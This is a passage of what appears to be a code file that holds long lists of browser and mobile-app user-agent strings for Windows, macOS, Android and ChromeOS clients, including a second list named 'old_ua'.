"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
"Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
"Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
"Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
"Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
"WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"Dalvik/2.1.0 (Linux; U; Android 5.1)",
"Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
"Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
"Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
"Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",
"Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
"Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
"Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"]
old_ua=[
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
"Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
"Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
"Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
"Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36",
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)",
"Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",
"MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
